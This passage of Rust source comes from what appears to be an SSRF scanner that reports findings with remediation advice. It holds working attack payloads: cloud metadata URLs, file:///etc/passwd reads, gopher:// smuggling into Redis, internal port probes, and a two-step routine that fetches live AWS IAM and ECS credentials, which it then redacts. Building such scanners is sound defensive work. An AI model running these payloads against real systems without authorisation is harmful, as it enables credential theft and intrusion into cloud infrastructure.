    // Port-based hints only when the body also differs materially (avoid guessing from port alone).
    let port_hint = target
        .split(':')
        .nth(1)
        .and_then(|p| p.trim_end_matches('/').parse::<u16>().ok());
    if let Some(9200) = port_hint {
        if body.contains("cluster") || body.contains("elastic") {
            return Some(("Elasticsearch (port 9200)", "elastic", "medium"));
        }
    }
    None
}

/// Parse ECS/Fargate relative credential paths from a listing body (JSON array or newline paths).
fn parse_ecs_credential_paths(body: &str) -> Vec<String> {
    let trimmed = body.trim();
    if let Ok(arr) = serde_json::from_str::<Vec<String>>(trimmed) {
        return arr.into_iter().filter(|s| !s.is_empty()).take(3).collect();
    }
    if let Ok(obj) = serde_json::from_str::<Value>(trimmed) {
        if let Some(arr) = obj.as_array() {
            return arr
                .iter()
                .filter_map(|v| v.as_str().map(str::to_string))
                .take(3)
                .collect();
        }
    }
    trimmed
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && l.len() <= 256 && !l.contains('<') && !l.contains(' '))
        .take(3)
        .map(str::to_string)
        .collect()
}

/// After a metadata listing hit, enumerate every IAM role / ECS path (≤3) and fetch live credentials.
async fn extract_aws_credential_chain(
    client: &reqwest::Client,
    probe: &Probe,
    listing_body: &str,
    host: &str,
    posture: &mut Posture,
    seen_titles: &mut BTreeSet<String>,
) -> Vec<Value> {
    let roles: Vec<String> = if probe.payload.ends_with("security-credentials/") {
        parse_iam_roles(listing_body)
    } else if probe.payload.contains("169.254.170.2/v2/credentials") {
        parse_ecs_credential_paths(listing_body)
    } else {
        return Vec::new();
    };
    if roles.is_empty() {
        return Vec::new();
    }

    let mut out = Vec::new();
    for role in roles {
        let cred_payload = if probe.payload.contains("169.254.170.2/v2/credentials") {
            if role.starts_with("http://") {
                role.clone()
            } else if role.starts_with('/') {
                format!("http://169.254.170.2{}", role.trim_end_matches('/'))
            } else {
                format!("http://169.254.170.2/v2/credentials/{role}")
            }
        } else {
            format!("{}{}", probe.payload, role)
        };
        let old_enc = urlencoding::encode(&probe.payload).into_owned();
        let new_enc = urlencoding::encode(&cred_payload).into_owned();
        let follow_url = if probe.url.contains(&old_enc) {
            probe.url.replace(&old_enc, &new_enc)
        } else if let Some(param) = param_name(&probe.point_label) {
            add_query(
                probe.url.split('?').next().unwrap_or(&probe.url),
                &param,
                &cred_payload,
            )
        } else {
            continue;
        };
        let Some(fp) = http_get(client, &follow_url).await else {
            continue;
        };
        let has_creds = fp.body.contains("AccessKeyId")
            && (fp.body.contains("SecretAccessKey") || fp.body.contains("Token"));
        if !has_creds {
            continue;
        }
        posture.credential_extraction = true;
        let label = if probe.payload.contains("169.254.170.2") {
            format!("CONFIRMED ECS/Fargate Credential Extraction ({role})")
        } else {
            format!("CONFIRMED AWS Credential Extraction (IAM role '{role}')")
        };
        if !seen_titles.insert(label.clone()) {
            continue;
        }
        posture.record("critical", &label);
        let red = redact_secrets(&fp.body);
        let ev2 = Evidence::new()
            .with("iam_role_or_task", role.clone())
            .with("credential_url", cred_payload.clone())
            .with(
                "via_parameter",
                param_name(&probe.point_label).unwrap_or_default(),
            )
            .with("leaked_material", json!(red.clone()))
            .with("http_status", i64::from(fp.status))
            .check("step1_listed_role_or_task", true, role.clone())
            .check(
                "step2_fetched_credentials",
                true,
                "AccessKeyId + SecretAccessKey returned",
            )
            .raw_excerpt(fp.body.as_bytes());
        let desc = if probe.payload.contains("169.254.170.2") {
            format!(
                "Full SSRF exploitation confirmed: enumerated ECS task credential path '{role}', then fetched live temporary credentials via {cred_payload}. Leaked (redacted): {}. Rotate the task role immediately and block link-local egress.",
                if red.is_empty() { "credential material".to_string() } else { red.join(", ") }
            )
        } else {
            format!(
                "Full SSRF exploitation confirmed: enumerated IAM role '{role}' from the metadata service, then fetched its live temporary credentials via {cred_payload}. Leaked (redacted): {}. Enforce IMDSv2 with hop-limit 1 and rotate the role credentials immediately.",
                if red.is_empty() { "credential material".to_string() } else { red.join(", ") }
            )
        };
        out.push(mk_finding(
            &label,
            "critical",
            &desc,
            host,
            &follow_url,
            0.99,
            "aws",
            "credential_extraction",
            ev2,
        ));
    }
    out
}

fn remediation_for(finding_kind: &str, provider: &str) -> &'static str {
    match finding_kind {
        "credential_extraction" => "Enforce IMDSv2 with hop-limit 1, block egress to 169.254.0.0/16 and link-local ranges, rotate the exposed IAM role credentials immediately, and audit CloudTrail for abuse.",
        "metadata_exposure" | "imdsv2_posture" => {
            if provider.starts_with("aws") {
                "Require IMDSv2-only with hop-limit 1, block egress to 169.254.0.0/16 and link-local ranges, restrict outbound metadata access at the network layer, and rotate any role credentials that may have been exposed."
            } else {
                "Block server-side fetches to cloud metadata endpoints (169.254.169.254, metadata.*), validate URLs against an allow-list, and rotate any credentials reachable via SSRF."
            }
        }
        "file_read" => "Disable file://, gopher://, and dict:// in the URL fetcher; validate scheme and host against a strict allow-list.",
        "internal_service" | "saas_fingerprint" | "differential_fetch" | "blind_ssrf_timing" => {
            "Validate and allow-list outbound URLs, disable redirects to internal hosts, and segment internal services from the application network."
        }
        "graphql_ssrf" | "multipart_ssrf" => {
            "Disable server-side URL fetch in GraphQL/multipart handlers unless strictly required; validate scheme/host against an allow-list and block metadata/link-local ranges."
        }
        "redirect_metadata_chain" => {
            "Never follow unvalidated redirects to attacker-controlled URLs; block redirect chains to link-local/metadata endpoints."
        }
        "open_redirect" => "Validate redirect targets against an allow-list; never reflect unvalidated URLs in Location headers.",
        "oob_planted" => "If OAST callbacks are observed, treat as confirmed blind SSRF: block internal/metadata targets and validate all outbound fetches.",
        _ => "Validate all user-supplied URLs server-side; deny access to link-local, RFC1918, and metadata IP ranges.",
    }
}

/// Build the set of injection points: the base URL plus optional discovered/operator paths.
fn injection_points(base: &str, extra: &[String]) -> Vec<String> {
    let b = base.trim_end_matches('/').to_string();
    let mut pts = vec![b.clone()];
    for p in extra {
        let p = p.trim();
        if p.is_empty() {
            continue;
        }
        if p.starts_with("http://") || p.starts_with("https://") {
            pts.push(p.trim_end_matches('/').to_string());
        } else {
            pts.push(format!("{}/{}", b, p.trim_start_matches('/')));
        }
    }
    pts.sort();
    pts.dedup();
    pts
}

// ─────────────────────────────────────────────────────────────────────────────
// Probe model.
// ─────────────────────────────────────────────────────────────────────────────

#[derive(Clone, Copy, PartialEq, Eq)]
enum TestKind {
    QueryMetadata,
    HeaderMetadata,
    Scheme,
    OpenRedirect,
    Oob,
}

struct Probe {
    kind: TestKind,
    point_label: String,
    url: String,
    headers: Vec<(String, String)>,
    payload: String,
    provider: &'static str,
    canaries: &'static [&'static str],
    base_severity: &'static str,
    note: &'static str,
}

const FILE_CANARIES: &[&str] = &[
    "root:x:0:0",
    ":/root:",
    "daemon:",
    "[fonts]",
    "[extensions]",
];

fn provider_allowed(settings: &Settings, provider: &str) -> bool {
    if settings.provider_filter.is_empty() {
        return true;
    }
    let base = provider.split('-').next().unwrap_or(provider);
    settings.provider_filter.contains(provider) || settings.provider_filter.contains(base)
}

fn build_work(settings: &Settings, points: &[String]) -> Vec<Probe> {
    let mut work: Vec<Probe> = Vec::new();

    // 1) Query-parameter metadata SSRF (the core surface).
    if settings.check_metadata {
        for mt in metadata_corpus() {
            if mt.min_depth > settings.depth {
                continue;
            }
            if mt.provider.contains("bypass") && !settings.parser_bypass {
                continue;
            }
            if !provider_allowed(settings, mt.provider) {
                continue;
            }
            for point in points {
                for param in &settings.params {
                    work.push(Probe {
                        kind: TestKind::QueryMetadata,
                        point_label: format!("param '{param}'"),
                        url: add_query(point, param, mt.url),
                        headers: Vec::new(),
                        payload: mt.url.to_string(),
                        provider: mt.provider,
                        canaries: mt.canaries,
                        base_severity: "critical",
                        note: mt.note,
                    });
                }
            }
        }
    }

    // 1b) Operator-supplied custom SSRF payloads (bespoke internal targets) — detected via the
    // calibrated differential path since they carry no provider canary.
    for payload in &settings.custom_payloads {
        for point in points {
            for param in &settings.params {
                work.push(Probe {
                    kind: TestKind::QueryMetadata,
                    point_label: format!("param '{param}'"),
                    url: add_query(point, param, payload),
                    headers: Vec::new(),
                    payload: payload.clone(),
                    provider: "custom",
                    canaries: &[],
                    base_severity: "high",
                    note: "operator-specified SSRF payload",
                });
            }
        }
    }

    // 1c) Filter-bypass URL wrappers (@ / # / backslash) on high-value metadata URLs.
    if settings.parser_bypass && settings.check_metadata {
        let wrappers: Vec<(&MetaTarget, Vec<(String, &'static str)>)> = metadata_corpus()
            .iter()
            .filter(|m| {
                m.min_depth <= settings.depth
                    && !m.provider.contains("bypass")
                    && provider_allowed(settings, m.provider)
            })
            .take(5)
            .map(|m| (m, filter_bypass_variants(m.url)))
            .collect();
        for (mt, variants) in wrappers {
            for (variant, bypass_note) in variants {
                for point in points {
                    for param in settings.params.iter().take(6) {
                        work.push(Probe {
                            kind: TestKind::QueryMetadata,
                            point_label: format!("param '{param}'"),
                            url: add_query(point, param, &variant),
                            headers: Vec::new(),
                            payload: variant.clone(),
                            provider: mt.provider,
                            canaries: mt.canaries,
                            base_severity: "critical",
                            note: bypass_note,
                        });
                    }
                }
            }
        }
    }

    // 2) Header-based SSRF / routing abuse (top metadata targets via spoofable headers).
    if settings.test_headers && settings.check_metadata {
        for mt in metadata_corpus()
            .iter()
            .filter(|m| m.min_depth <= 2 && provider_allowed(settings, m.provider))
        {
            for h in SSRF_HEADERS {
                let val = if *h == "X-Forwarded-For" || h.ends_with("-IP") || *h == "Client-IP" {
                    "169.254.169.254".to_string()
                } else {
                    mt.url.to_string()
                };
                work.push(Probe {
                    kind: TestKind::HeaderMetadata,
                    point_label: format!("header '{h}'"),
                    url: points[0].clone(),
                    headers: vec![(h.to_string(), val)],
                    payload: mt.url.to_string(),
                    provider: mt.provider,
                    canaries: mt.canaries,
                    base_severity: "high",
                    note: mt.note,
                });
            }
        }
    }

    // 3) Alternate schemes (file:// local read, gopher/dict internal smuggling).
    if settings.test_schemes {
        let schemes: &[(&str, &str)] = &[
            (
                "file:///etc/passwd",
                "file:// local file read (/etc/passwd)",
            ),
            (
                "file:///c:/windows/win.ini",
                "file:// local file read (win.ini)",
            ),
            (
                "gopher://127.0.0.1:6379/_INFO%0d%0a",
                "gopher:// internal protocol smuggling (redis)",
            ),
            (
                "dict://127.0.0.1:11211/stats",
                "dict:// internal protocol smuggling (memcached)",
            ),
        ];
        for (payload, note) in schemes {
            for point in points {
                for param in settings.params.iter().take(if settings.depth >= 4 {
                    settings.params.len()
                } else {
                    8
                }) {
                    work.push(Probe {
                        kind: TestKind::Scheme,
                        point_label: format!("param '{param}'"),
                        url: add_query(point, param, payload),
                        headers: Vec::new(),
                        payload: (*payload).to_string(),
                        provider: "scheme",
                        canaries: FILE_CANARIES,
                        base_severity: "high",
                        note,
                    });
                }
            }
        }
    }

    // 4) Open redirect (SSRF chaining + phishing).
    if settings.open_redirect {
        for point in points {
            for param in &settings.redirect_params {
                work.push(Probe {
                    kind: TestKind::OpenRedirect,
                    point_label: format!("param '{param}'"),
                    url: add_query(point, param, REDIRECT_MARKER_URL),
                    headers: Vec::new(),
                    payload: REDIRECT_MARKER_URL.to_string(),
                    provider: "redirect",
                    canaries: &[],
                    base_severity: "high",
                    note: "open redirect enables SSRF chaining and phishing",
                });
            }
        }
    }

    // 5) Out-of-band (blind) planting when an interaction domain is configured + OOB enabled.
    if let Some(dom) = settings
        .oast_domain
        .as_deref()
        .filter(|_| settings.oob_enabled)
    {
        let token = settings
            .oast_token
            .clone()
            .filter(|t| !t.trim().is_empty())
            .unwrap_or_else(|| {
                format!(
                    "w{}",
                    chrono::Utc::now()
                        .timestamp_nanos_opt()
                        .unwrap_or(0)
                        .unsigned_abs()
                )
            });
        let oob_url = format!("http://{token}.{}/", dom.trim().trim_start_matches('.'));
        for point in points {
            for param in settings.params.iter().take(12) {
                work.push(Probe {
                    kind: TestKind::Oob,
                    point_label: format!("param '{param}'"),
                    url: add_query(point, param, &oob_url),
                    headers: Vec::new(),
                    payload: oob_url.clone(),
                    provider: "oob",
                    canaries: &[],
                    base_severity: "info",
                    note: "out-of-band SSRF probe planted — confirm via interaction server",
                });
            }
        }
        if settings.test_headers {
            for h in SSRF_HEADERS.iter().take(6) {
                work.push(Probe {
                    kind: TestKind::Oob,
                    point_label: format!("header '{h}'"),
                    url: points[0].clone(),
                    headers: vec![(h.to_string(), oob_url.clone())],
                    payload: oob_url.clone(),
                    provider: "oob",
                    canaries: &[],
                    base_severity: "info",
                    note: "out-of-band SSRF probe planted in header",
                });
            }
        }
    }

    work.truncate(settings.max_requests);
    work
}

// ─────────────────────────────────────────────────────────────────────────────
// Detection.
// ─────────────────────────────────────────────────────────────────────────────

fn canary_hit<'a>(body: &str, canaries: &'a [&'a str]) -> Option<&'a str> {
    canaries
        .iter()
        .copied()
        .find(|c| !c.is_empty() && body.contains(*c))
}

fn passwd_signature(body: &str) -> bool {
    // Anchored /etc/passwd shape (uid:gid 0) — avoids matching the literal "root:" in prose.
    static RE: std::sync::OnceLock<Option<regex::Regex>> = std::sync::OnceLock::new();
    let unix = match RE.get_or_init(|| regex::Regex::new(r"root:.{0,40}:0:0:").ok()) {
        Some(re) => re.is_match(body),
        None => body.contains("root:") && body.contains(":0:0:"),
    };
    unix || body.contains("[fonts]") || body.contains("for 16-bit app support")
}

/// A response is "reflection" (not server-side fetch) if the payload/host is echoed in the body.
fn looks_like_reflection(body: &str, payload: &str) -> bool {
    if body.contains(payload) {
        return true;
    }
    for needle in [
        "169.254.169.254",
        "metadata.google.internal",
        "100.100.100.200",
        "file:///",
    ] {
        if payload.contains(needle) && body.contains(needle) {
            return true;
        }
    }
    false
}

/// Parse IAM role name(s) from an AWS IMDS `security-credentials/` listing body (newline-separated
/// role names). Bounded + sanitised so the two-step extraction only follows plausible role names.
fn parse_iam_roles(body: &str) -> Vec<String> {
    body.lines()
        .map(str::trim)
        .filter(|l| {
            !l.is_empty()
                && l.len() <= 128
                && !l.contains(' ')
                && !l.contains('<')
                && l.chars().all(|c| {
                    c.is_ascii_alphanumeric()
                        || matches!(c, '-' | '_' | '+' | '=' | '.' | '@' | '/')
                })
        })
        .take(3)
        .map(str::to_string)
        .collect()
}

/// Extract and **redact** leaked secret material from a retrieved body so a finding proves real
/// exposure without ever writing the live secret to storage/UI. Returns human-safe descriptors.
fn redact_secrets(body: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    // AWS access key IDs (AKIA/ASIA/AROA/AIDA/AGPA/ANPA…) — show the 4-char prefix only.
    static AWS_KEY: std::sync::OnceLock<Option<regex::Regex>> = std::sync::OnceLock::new();
    if let Some(re) = AWS_KEY.get_or_init(|| {
        regex::Regex::new(r"(?:AKIA|ASIA|AROA|AIDA|AGPA|ANPA|AIPA)[A-Z0-9]{12,20}").ok()
    }) {
        if let Some(m) = re.find(body) {
            let s = m.as_str();
            let prefix: String = s.chars().take(4).collect();
            out.push(format!(
                "AWS Access Key ID {}…**** ({} chars, redacted)",
                prefix,
                s.len()
            ));
        }
    }
    if body.contains("SecretAccessKey")
        || body.contains("AccessKeySecret")
        || body.contains("TmpSecretKey")
    {
        out.push("Cloud secret access key present (redacted)".into());
    }
    // OAuth bearer tokens (GCP/Azure/Yandex managed-identity) — report presence + length only.
    if let Some(idx) = body.find("access_token") {
        let tail = &body[idx..body.len().min(idx + 220)];
        let len = tail
            .split(['"', ':', ',', ' '])
            .find(|t| {
                t.len() > 20
                    && t.chars()
                        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_'))
            })
            .map(str::len)
            .unwrap_or(0);
        out.push(format!(
            "OAuth access_token present (~{len} chars, redacted)"
        ));
    }
    if body.contains("\"Token\"")
        || body.contains("SecurityToken")
        || body.contains("securitytoken")
    {
        out.push("Session/security token present (redacted)".into());
    }
    out.dedup();
    out
}

#[derive(Default)]
struct Posture {
    confirmed: u32,
    by_sev: BTreeMap<String, u32>,
    providers: BTreeSet<String>,
    metadata_confirmed: bool,
    arbitrary_fetch: bool,
    file_read: bool,
    open_redirect: bool,
    oob_planted: bool,
    internal_service: bool,
    credential_extraction: bool,
    imdsv2_reachable: bool,
    redirect_metadata_chain: bool,
    score: f64,
    crown_jewels: Vec<String>,
}

impl Posture {
    fn record(&mut self, severity: &str, title: &str) {
        self.confirmed += 1;
        *self.by_sev.entry(severity.to_string()).or_insert(0) += 1;
        self.score += match severity {
            "critical" => 0.4,
            "high" => 0.22,
            "medium" => 0.1,
            "low" => 0.03,
            _ => 0.0,
        };
        if severity == "critical"
            && self.crown_jewels.len() < 6
            && !self.crown_jewels.iter().any(|c| c == title)
        {
            self.crown_jewels.push(title.to_string());
        }
    }
}

#[allow(clippy::too_many_arguments)]
fn mk_finding(
    title: &str,
    severity: &str,
    description: &str,
    target: &str,
    url: &str,
    confidence: f64,
    provider: &str,
    finding_kind: &str,
    ev: Evidence,
) -> Value {
    let mitre = if provider == "redirect" {
        "T1090"
    } else if provider == "oob" {
        "T1090"
    } else {
        "T1552.005"
    };
    let mut f = finding_rich(
        ENGINE_ID,
        title,
        severity,
        mitre,
        description,
        target,
        confidence,
        ev,
    );
    if let Some(o) = f.as_object_mut() {
        o.insert("url".into(), json!(url));
        o.insert("provider".into(), json!(provider));
        o.insert("finding_kind".into(), json!(finding_kind));
        o.insert(
            "remediation".into(),
            json!(remediation_for(finding_kind, provider)),
        );
        o.insert(
            "compliance".into(),
            json!([
                "OWASP A10:2021-SSRF",
                "CWE-918",
                "NIST 800-53 SC-7",
                "CIS 13.3",
                "MITRE T1552.005"
            ]),
        );
    }
    f
}

struct Baseline {
    status: u16,
    body_len: usize,
}

// ─────────────────────────────────────────────────────────────────────────────
// Internal-port reachability via a confirmed SSRF parameter (optional phase).
// ─────────────────────────────────────────────────────────────────────────────

async fn phase_internal_ports(
    client: &reqwest::Client,
    settings: &Settings,
    points: &[String],
    capable_param: &str,
    baseline: &Baseline,
    target: &str,
    posture: &mut Posture,
) -> Vec<Value> {
    let mut out = Vec::new();
    let point = points.first().cloned().unwrap_or_default();
    // Targets: loopback ports (127.0.0.1:<port>) plus any operator-supplied internal hosts.
    let mut targets: Vec<String> = settings
        .internal_ports
        .iter()
        .map(|p| format!("http://127.0.0.1:{p}/"))
        .collect();
    for h in &settings.internal_hosts {
        let h = h.trim();
        if h.is_empty() {
            continue;
        }
        targets.push(if h.starts_with("http://") || h.starts_with("https://") {
            h.to_string()
        } else {
            format!("http://{h}/")
        });
    }
    targets.sort();
    targets.dedup();

    let probes: Vec<(String, String)> = targets
        .into_iter()
        .map(|t| {
            let url = add_query(&point, capable_param, &t);
            (t, url)
        })
        .collect();

    let results: Vec<Option<(String, HttpProbe)>> = stream::iter(probes)
        .map(|(t, url)| {
            let c = client.clone();
            async move { http_get(&c, &url).await.map(|p| (t, p)) }
        })
        .buffer_unordered(settings.concurrency)
        .collect()
        .await;

    for (t, p) in results.into_iter().flatten() {
        let delta = (p.body.len() as i64 - baseline.body_len as i64).unsigned_abs();
        let reachable =
            (p.status >= 200 && p.status < 500 && p.status != baseline.status) || delta > 256;
        if !reachable {
            continue;
        }
        if let Some((service, canary, sev)) = classify_internal_service(&p.body, &t) {
            let title = format!("SSRF: internal {service} fingerprinted ({t})");
            posture.record(sev, &title);
            posture.internal_service = true;
            let ev = Evidence::new()
                .with("internal_target", t.clone())
                .with("service", service)
                .with("via_parameter", capable_param)
                .with("canary_matched", canary)
                .with("http_status", i64::from(p.status))
                .check("saas_banner_match", true, format!("matched '{canary}'"))
                .raw_excerpt(p.body.as_bytes());
            out.push(mk_finding(
                &title,
                sev,
                &format!(
                    "Through SSRF parameter '{}', internal target {} returned a {} banner (canary '{}') — confirmed reachability of an internal-only admin/data service.",
                    capable_param, t, service, canary
                ),
                target,
                &add_query(&point, capable_param, &t),
                0.88,
                "internal",
                "saas_fingerprint",
                ev,
            ));
            continue;
        }
        let title = format!("SSRF: internal service reachable ({t})");
        posture.record("medium", &title);
        posture.internal_service = true;
        let ev = Evidence::new()
            .with("internal_target", t.clone())
            .with("via_parameter", capable_param)
            .with("http_status", i64::from(p.status))
            .with("baseline_status", i64::from(baseline.status))
            .with("body_delta_bytes", delta as i64)
            .check(
                "status_or_size_differential",
                true,
                format!("HTTP {} (Δ{} B)", p.status, delta),
            );
        out.push(mk_finding(
            &title,
            "medium",
            &format!(
                "Through SSRF parameter '{}', internal target {} responded differently from baseline (HTTP {}, body Δ{} B), indicating the server can reach internal-only resources.",
                capable_param, t, p.status, delta
            ),
            target,
            &add_query(&point, capable_param, &t),
            0.7,
            "internal",
            "internal_service",
            ev,
        ));
    }
    out
}

// ─────────────────────────────────────────────────────────────────────────────
// Time-based blind SSRF oracle — confirms blind SSRF with no OAST by latency analysis.
// ─────────────────────────────────────────────────────────────────────────────

async fn timed_get(client: &reqwest::Client, url: &str) -> u64 {
    let t0 = Instant::now();
    let _ = http_get(client, url).await;
    t0.elapsed().as_millis() as u64
}

async fn phase_timing_oracle(
    settings: &Settings,
    points: &[String],
    host: &str,
    posture: &mut Posture,
) -> (Vec<Value>, usize) {
    let mut out = Vec::new();
    let mut requests = 0usize;
    // Dedicated client with a longer ceiling so we can observe the server's *own* fetch timeout.
    let slow_ceiling = settings.timeout_ms.max(8_000).saturating_mul(3).min(45_000);
    let client = build_client(slow_ceiling, &settings.auth_headers).await;
    let point = points.first().cloned().unwrap_or_default();
    // Fast control = immediate TCP refuse on loopback; slow = non-routable RFC1918 host (connect hangs).
    let fast = "http://127.0.0.1:1/";
    let slow = "http://10.255.255.1/";
    for param in settings.params.iter().take(4) {
        let fast_url = add_query(&point, param, fast);
        let slow_url = add_query(&point, param, slow);
        // Two samples each; keep the minimum to reduce jitter.
        let fast_ms = timed_get(&client, &fast_url)
            .await
            .min(timed_get(&client, &fast_url).await);
        let slow_ms = timed_get(&client, &slow_url)
            .await
            .min(timed_get(&client, &slow_url).await);
        requests += 4;
        let delta = slow_ms.saturating_sub(fast_ms);
        // Blind-SSRF signature: the unreachable host delays the response ≥ 3s while the refusing
        // host returns quickly — the server is performing the outbound request server-side.
        if delta >= 3_000 && slow_ms >= 3_000 {
            let title = format!("Blind SSRF (time-based) via param '{param}'");
            posture.record("high", &title);
            posture.arbitrary_fetch = true;
            let ev = Evidence::new()
                .with("parameter", param.clone())
                .with("fast_payload", fast)
                .with("slow_payload", slow)
                .with("fast_ms", fast_ms as i64)
                .with("slow_ms", slow_ms as i64)
                .with("delta_ms", delta as i64)
                .check(
                    "timing_differential",
                    true,
                    format!("unreachable host delayed response by {delta} ms"),
                );
            out.push(mk_finding(
                &title,
                "high",
                &format!(
                    "Time-based blind SSRF: parameter '{}' pointed at an unreachable internal host ({}) delayed the response by {} ms versus a fast-refusing host ({} ms). The server performs the outbound request even though nothing is reflected — classic blind SSRF.",
                    param, slow, delta, fast_ms
                ),
                host,
                &slow_url,
                0.8,
                "blind",
                "blind_ssrf_timing",
                ev,
            ));
            break; // one confirmation is sufficient
        }
    }
    (out, requests)
}

// ─────────────────────────────────────────────────────────────────────────────
// POST/JSON body SSRF — webhook / URL-preview / PDF-render sinks take the URL in the body.
// ─────────────────────────────────────────────────────────────────────────────

const BODY_FIELDS: &[&str] = &[
    "url", "uri", "link", "webhook", "callback", "endpoint", "target", "image", "source", "src",
];

async fn phase_body_injection(
    client: &reqwest::Client,
    settings: &Settings,
    points: &[String],
    host: &str,
    posture: &mut Posture,
    seen: &mut BTreeSet<String>,
) -> (Vec<Value>, usize) {
    let mut out = Vec::new();
    // (point, meta_url, canaries, provider, body_field) — all 'static except the owned point.
    let mut jobs: Vec<(
        String,
        &'static str,
        &'static [&'static str],
        &'static str,
        &'static str,
    )> = Vec::new();
    for point in points {
        for mt in metadata_corpus()
            .iter()
            .filter(|m| m.min_depth <= 2 && provider_allowed(settings, m.provider))
        {
            for &bp in BODY_FIELDS {
                jobs.push((point.clone(), mt.url, mt.canaries, mt.provider, bp));
            }
        }
    }
    jobs.truncate(settings.max_requests / 4 + 8);
    let requests = jobs.len();

    // Stream FULLY-OWNED tuples (no borrows at all, not even `&'static str`) so `buffer_unordered`'s
    // higher-ranked lifetime bound is trivially satisfied.
    let owned: Vec<(usize, String, String, String)> = jobs
        .iter()
        .enumerate()
        .map(|(i, j)| (i, j.0.clone(), j.1.to_string(), j.4.to_string()))
        .collect();
    let results: Vec<Option<(usize, HttpProbe)>> = stream::iter(owned)
        .map(|(i, url, meta_url, bp)| {
            let client = client.clone();
            async move {
                let mut m = serde_json::Map::new();
                m.insert(bp, Value::String(meta_url));
                http_post_json(&client, &url, &Value::Object(m))
                    .await
                    .map(|p| (i, p))
            }
        })
        .buffer_unordered(settings.concurrency)
        .collect()
        .await;

    for (i, p) in results.into_iter().flatten() {
        let job = &jobs[i];
        let (meta_url, canaries, provider, bp) = (job.1, job.2, job.3, job.4);
        if let Some(hit) = canary_hit(&p.body, canaries) {
            let title = format!(
                "SSRF via JSON body field '{}' → {} metadata",
                bp,
                provider.to_uppercase()
            );
            if !seen.insert(title.clone()) {
                continue;
            }
            posture.record("critical", &title);
            posture.metadata_confirmed = true;
            posture
                .providers
                .insert(provider_base(provider).to_string());
            let leaked = redact_secrets(&p.body);
            let mut ev = Evidence::new()
                .with("body_field", bp)
                .with("payload", meta_url)
                .with("provider", provider)
                .with("canary_matched", hit)
                .with("http_status", i64::from(p.status))
                .check(
                    "json_body_injection",
                    true,
                    format!("POST {{\"{bp}\": \"{meta_url}\"}}"),
                )
                .raw_excerpt(p.body.as_bytes());
            if !leaked.is_empty() {
                ev = ev.with("leaked_material", json!(leaked.clone()));
            }
            out.push(mk_finding(
                &title,
                "critical",
                &format!(
                    "POSTing a JSON body with field '{}' set to {} caused the server to fetch it and return metadata (canary '{}'). {}Confirmed body-based SSRF with sensitive-data exposure.",
                    bp,
                    meta_url,
                    hit,
                    if leaked.is_empty() { String::new() } else { format!("Leaked (redacted): {}. ", leaked.join(", ")) }
                ),
                host,
                &job.0,
                0.97,
                provider,
                "metadata_exposure",
                ev,
            ));
        }
    }
    (out, requests)
}

// ─────────────────────────────────────────────────────────────────────────────
// XML/SOAP body SSRF — legacy enterprise sinks (SOAPAction, XML-RPC, SAML parsers).
// ─────────────────────────────────────────────────────────────────────────────

async fn phase_xml_body_injection(
    client: &reqwest::Client,
    settings: &Settings,
    points: &[String],
    host: &str,
    posture: &mut Posture,
    seen: &mut BTreeSet<String>,
) -> (Vec<Value>, usize) {
    let mut out = Vec::new();
    let mut jobs: Vec<(
        String,
        &'static str,
        &'static [&'static str],
        &'static str,
        &'static str,
    )> = Vec::new();
    for point in points.iter().take(3) {
        for mt in metadata_corpus()
            .iter()
            .filter(|m| m.min_depth <= 2 && provider_allowed(settings, m.provider))
        {
            for &bp in &["url", "uri", "link", "webhook", "endpoint"] {
                jobs.push((point.clone(), mt.url, mt.canaries, mt.provider, bp));
            }
        }
    }
    jobs.truncate(settings.max_requests / 6 + 4);
    let requests = jobs.len();

    let owned: Vec<(usize, String, String, String)> = jobs
        .iter()
        .enumerate()
        .map(|(i, j)| (i, j.0.clone(), j.1.to_string(), j.4.to_string()))
        .collect();
    let results: Vec<Option<(usize, HttpProbe)>> = stream::iter(owned)
        .map(|(i, url, meta_url, bp)| {
            let client = client.clone();
            async move {
                http_post_xml(&client, &url, &bp, &meta_url)
                    .await
                    .map(|p| (i, p))
            }
        })
        .buffer_unordered(settings.concurrency)
        .collect()
        .await;

    for (i, p) in results.into_iter().flatten() {
        let job = &jobs[i];
        let (meta_url, canaries, provider, bp) = (job.1, job.2, job.3, job.4);
        if let Some(hit) = canary_hit(&p.body, canaries) {
            let title = format!(
                "SSRF via XML body field '{bp}' → {} metadata",
                provider.to_uppercase()
            );
            if !seen.insert(title.clone()) {
                continue;
            }
            posture.record("critical", &title);
            posture.metadata_confirmed = true;
            posture
                .providers
                .insert(provider_base(provider).to_string());
            let leaked = redact_secrets(&p.body);
            let mut ev = Evidence::new()
                .with("body_field", bp)
                .with("content_type", "application/xml")
                .with("payload", meta_url)
                .with("provider", provider)
                .with("canary_matched", hit)
                .with("http_status", i64::from(p.status))
                .check(
                    "xml_body_injection",
                    true,
                    format!("POST XML <{bp}>{meta_url}</{bp}>"),
                )
                .raw_excerpt(p.body.as_bytes());
            if !leaked.is_empty() {
                ev = ev.with("leaked_material", json!(leaked.clone()));
            }
            out.push(mk_finding(
                &title,
                "critical",
                &format!(
                    "POSTing XML with element '{bp}' set to {meta_url} caused the server to fetch cloud metadata (canary '{hit}'). {}Confirmed XML/SOAP body-based SSRF.",
                    if leaked.is_empty() { String::new() } else { format!("Leaked (redacted): {}. ", leaked.join(", ")) }
                ),
                host,
                &job.0,
                0.96,
                provider,
                "metadata_exposure",
                ev,
            ));
        }
    }
    (out, requests)
}

// ─────────────────────────────────────────────────────────────────────────────
// GraphQL SSRF — URL variables / inline fetch arguments on common GraphQL endpoints.
// ─────────────────────────────────────────────────────────────────────────────

const GRAPHQL_SSRF_DOCS: &[(&str, &str)] = &[
    (
        "query FetchRemote($url: String!) { __typename }",
        "typename_probe",
    ),
    (
        "query Preview($url: String!) { urlPreview(url: $url) { status } }",
        "urlPreview",
    ),
    (
        "mutation Import($url: String!) { importFromUrl(url: $url) { ok } }",
        "importFromUrl",
    ),
    (
        "query Render($u: String!) { render(url: $u) { html } }",
        "render",
    ),
    (
        "query Og($url: String!) { openGraph(url: $url) { title } }",
        "openGraph",
    ),
    (
        "mutation Webhook($url: String!) { registerWebhook(url: $url) { id } }",
        "registerWebhook",
    ),
];

async fn phase_graphql_injection(
    client: &reqwest::Client,
    settings: &Settings,
    base: &str,
    host: &str,
    posture: &mut Posture,
    seen: &mut BTreeSet<String>,
) -> (Vec<Value>, usize) {
    let mut out = Vec::new();
    let endpoints = graphql_probe_endpoints(base);
    let meta = metadata_corpus()
        .iter()
